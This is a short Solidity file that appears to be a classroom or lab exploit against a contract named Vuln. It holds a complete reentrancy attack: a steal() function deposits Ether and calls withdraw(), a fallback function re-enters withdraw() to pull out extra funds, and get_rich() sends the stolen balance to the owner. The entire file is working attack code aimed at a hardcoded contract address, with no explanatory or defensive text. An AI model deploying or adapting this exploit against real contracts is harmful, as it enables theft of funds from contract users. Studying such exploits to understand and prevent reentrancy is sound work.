pragma solidity ^0.5.0;

import 'browser/vuln.sol';

contract attack {
    address owner;
    uint ini_balance;
    
    Vuln vuln = Vuln(address(0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C));
    
    constructor () public{
        owner = msg.sender;
    }
    
    function steal() public payable {
        vuln.deposit.value(msg.value)();
        ini_balance = address(this).balance;
        vuln.withdraw();
    }
    
    /* Check within if statement ensures that withdraw function executes twice in total */
    function () external payable {
        if((address(this).balance - ini_balance) < (2*(msg.value))) {
            vuln.withdraw();
        }
    }
    
    function get_rich() public {
        if(msg.sender == owner) {
            msg.sender.send(address(this).balance);    
        }
    }
}